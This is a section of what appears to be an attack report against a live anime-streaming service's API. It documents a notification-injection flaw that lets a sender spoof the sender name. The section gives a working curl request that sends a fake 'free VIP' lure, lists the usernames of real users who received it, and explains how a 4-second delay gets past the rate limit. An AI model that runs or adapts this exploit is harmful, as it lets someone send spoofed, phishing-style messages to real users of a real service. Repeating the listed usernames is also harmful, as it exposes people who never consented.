## 8. NOTIFICATION INJECTION (chat-message)

### Vulnerability
`POST /api/miku/7/9/notifications/chat-message` accepts `to_uid` and
`from_name` as attacker-controlled fields. The notification appears in
the recipient's in-app notification feed with a spoofed sender name.

**NOTE:** This sends to the in-app notification feed, NOT the Android
notification bar. Push notifications to the Android notification bar
require admin broadcast endpoints + FCM server key.

### Endpoint
```
POST /api/miku/7/9/notifications/chat-message
```

### Fields
```json
{
  "to_uid": "<victim_uid>",
  "from_name": "Yanzz X MikuNime",
  "message": "<attacker-controlled message>"
}
```

# EXECUTION TRACE
```bash
curl -s -X POST "https://panel.mikunime.web.id/api/miku/7/9/notifications/chat-message" \
  -H "Authorization: Bearer miku_[REDACTED]" \
  -H "X-Miku-Auth: vps" \
  -H "Content-Type: application/json" \
  -d '{
    "to_uid": "[REDACTED]",
    "from_name": "Yanzz X MikuNime",
    "message": "Selamat! Kamu mendapat VIP 7 hari gratis dari event spesial."
  }'
```

### Notifications Sent to 11 Users
```
void28119, nanase, dvvanime, suaminyashinobu, MUH RIDWAN,
error404, Cathzy 969, fabian cool, bagusmaull78, dintafahreza
```

### Rate Limit
429 after ~3 rapid requests. 4-second delay bypasses it.

